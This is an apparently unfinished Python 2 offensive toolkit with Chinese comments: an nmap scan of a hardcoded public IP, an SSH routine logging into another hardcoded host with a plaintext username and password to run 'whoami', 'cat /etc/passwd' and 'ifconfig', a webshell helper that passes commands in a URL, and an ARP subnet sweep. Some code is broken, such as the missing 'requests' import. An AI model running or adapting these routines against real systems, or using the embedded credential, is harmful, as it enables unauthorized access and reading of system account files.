#!/usr/bin/python
# coding:utf-8

# ssh
import paramiko  

import os
import nmap

nm = nmap.PortScanner()

nm.scan('25.25.205.36', arguments='-v -Pn')
# 列出结果
def list_nmap_report(nm):
    for host in nm.all_hosts():
        print nm[host]
        print('----------------------------------------------------')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            lport.sort()
            for port in lport:
                print ('port : %s\tstate : %s' % (port, nm[host][proto][port]['state']))


list_nmap_report(nm)



# 弹shell


# ssh shell

def sshclient_execmd_main():
    hostname = '134.175.70.181'  
    port = 22  
    username = 'ubuntu'  
    password = '63KRhmMwvVsAdTy'
    execmd_list = ["whoami","cat /etc/passwd", "ifconfig"]  
      
    sshclient_execmd(hostname, port, username, password, execmd_list)  

def sshclient_execmd(hostname, port, username, password, execmd_list):   
    paramiko.util.log_to_file("paramiko.log")       
    s = paramiko.SSHClient()  
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    s.connect(hostname=hostname, port=port, username=username, password=password) 

    for execmd in execmd_list:
        stdin, stdout, stderr = s.exec_command (execmd)
        print stdout.read()
        #stdin.write("Y")  # Generally speaking, the first connection, need a simple interaction.  
    s.close()
    a = '''
    pkey='E:/wamp/www/tools/id_rsa'  #本地密钥文件路径[此文件服务器上~/.ssh/id_rsa可下载到本地]
    key=paramiko.RSAKey.from_private_key_file(pkey,password='******') #有解密密码时,
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('127.0.0.1',username = 'root',password='******',pkey=key)
    for execmd in execmd_list:
        stdin, stdout, stderr = ssh.exec_command (execmd)
        print stdout.read()
        #stdin.write("Y")  # Generally speaking, the first connection, need a simple interaction.  
    s.close()
    '''

    a = '''
    key_file = "/mnt/c/CTF-current/"
    key_file_pwd = "666"
    paramiko.util.log_to_file('ssh_key-login.log')
    privatekey = os.path.expanduser(key_file) #私钥文件
    try:
        key = paramiko.RSAKey.from_private_key_file(privatekey)
    except paramiko.PasswordRequiredException:
        #需要密钥口令
        key = paramiko.RSAKey.from_private_key_file(privatekey,key_file_pwd)

    ssh = paramiko.SSHClient()
    ssh.load_system_host_keys(filename='/root/.ssh/known_hosts')
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=hostname,username=username,pkey=key)
    stdin,stdout,stderr=ssh.exec_command('free -m') #执行远程主机系统命令
    print stdout.read()
    ssh.close()
    '''


# webshell
  
def web_shell(url, exec_cmd):
    try:
        shell = requests.get(url+exec_cmd)
        if shell.code >= 400:
            return False
        else:
            return shell.content
    except Exception as err:
        print err
        return False


# arp获得 - NMAP有一点重，用指令有一点慢

from scapy.all import srp, Ether, ARP

def arp_scan():
    IpScan = '192.168.114.1/24'
    try:
        ans,unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=IpScan), timeout=2)
    except Exception as e:
        print(e)
    else:
        for send, rcv in ans:
            ListMACAddr = rcv.sprintf("%Ether.src%---%ARP.psrc%")

'''
40:5E:2A:6C:90:98--192.168.31.1
20:42:EC:51:F3:8E--192.168.31.114
'''

# shell管理

